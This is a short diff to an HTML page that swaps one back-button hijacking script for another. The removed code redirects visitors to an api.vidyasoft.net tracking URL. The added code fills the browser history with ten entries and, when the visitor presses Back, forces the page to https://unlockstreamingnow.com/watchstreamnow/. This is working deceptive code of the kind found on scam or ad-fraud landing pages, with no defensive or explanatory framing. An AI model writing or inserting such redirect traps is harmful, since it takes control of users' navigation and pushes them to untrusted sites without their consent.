@@ -411,18 +411,17 @@ function timer() {
 </script>
 
 <script>
-(function(window, location) {
-history.replaceState(null, document.title, location.pathname+"#!/history");
-history.pushState(null, document.title, location.pathname);
-
-window.addEventListener("popstate", function() {
-  if(location.hash === "#!/history") {
-    history.replaceState(null, document.title, location.pathname);
-    setTimeout(function(){
-      location.replace("https://api.vidyasoft.net/redirect?utm_source=insta&cid={clickId}&language={lang}");
-    },0);
-  }
-}, false);
-}(window, location));
+    ! function() {
+    var t;
+    try {
+        const URL = window.location.href.split(/[#]/)[0];
+        for (t = 0; 10 > t; ++t) history.pushState({}, "", URL + '#')
+        onpopstate = function(event) {
+            event.state && location.replace('https://unlockstreamingnow.com/watchstreamnow/');
+        }
+    } catch (o) {
+        console.log(o);
+    }
+}();
 </script>
 </body></html>
